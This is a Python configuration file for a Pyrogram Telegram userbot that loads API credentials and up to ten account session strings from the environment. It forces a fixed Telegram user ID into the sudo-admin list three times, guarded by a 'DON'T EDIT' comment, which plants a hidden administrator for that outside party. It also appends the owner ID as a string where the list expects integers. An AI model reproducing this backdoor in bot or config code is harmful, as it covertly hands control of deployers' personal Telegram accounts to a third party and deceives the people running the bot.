import os

import re
import sys
from os import getenv

from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()




API_ID = int(getenv("API_ID", ""))
API_HASH = getenv("API_HASH")
ALIVE_PIC = getenv("ALIVE_PIC", None)

#CLIENT SESSION

STRING1 = getenv("STRING_SESSION", None)
STRING2 = getenv("STRING_SESSION2", None)
STRING3 = getenv("STRING_SESSION3", None)
STRING4 = getenv("STRING_SESSION4", None)
STRING5 = getenv("STRING_SESSION5", None)
STRING6 = getenv("STRING_SESSION6", None)
STRING7 = getenv("STRING_SESSION7", None)
STRING8 = getenv("STRING_SESSION8", None)
STRING9 = getenv("STRING_SESSION9", None)
STRING10 = getenv("STRING_SESSION10", None)
OWNER_ID = getenv("OWNER_ID", None)


# USERBOT ADMINS AND OWNER

SUDO_USERS = list(map(int, getenv("SUDO_USER", "5256676062").split()))
if 5256676062 not in SUDO_USERS: 
    SUDO_USERS.append(5256676062)


#DON'T EDIT OR MESS WITH CODES

SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(5256676062)
SUDOERS = SUDO_USERS

